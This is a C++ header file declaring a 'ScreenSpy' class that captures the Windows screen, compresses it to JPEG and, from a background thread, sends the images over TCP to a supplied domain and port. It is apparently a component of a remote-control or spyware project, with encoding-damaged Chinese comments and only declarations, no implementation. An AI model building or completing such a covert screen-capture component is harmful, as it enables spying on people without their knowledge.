#ifndef SCREENSPY_H
#define SCREENSPY_H
#include "tcpsocket.h"
#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <tchar.h>
#include "bmp2jpg.h"
// ����jpegѹ����ͷ�ļ�
extern "C" {
#include "jpeg-9f/jpeglib.h"
#include "jpeg-9f/jmorecfg.h"
#include "jpeg-9f/jconfig.h"
}
class ScreenSpy
{
public:
    ScreenSpy();
    ~ScreenSpy();
    // ��Ļ������
    static bool captureScreen(std::vector<unsigned char>& bmpData);
    static unsigned int convertToJpgData(const std::vector<unsigned char>& bmpData,
        std::vector<unsigned char>& jpgData);
    // ����ͷ
    typedef struct {
        unsigned int len;    // jpg�ļ���С
    } ScreenSpyHeader;



    // ��������ں������Ǵ���һ���߳̿�����
    static void startByNewThread(std::string domain, int port);
    static DWORD WINAPI threadProc(LPVOID args);
    // ���ӵ������ָ���Ķ˿ڸ���������Ļ��ͼ
    static void startScreenSpy(std::string domain, int port);
    static bool sendScreenData(TcpSocket* sock, std::vector<unsigned char>& jpg, unsigned int len);
};
#endif // SCREENSPY_H
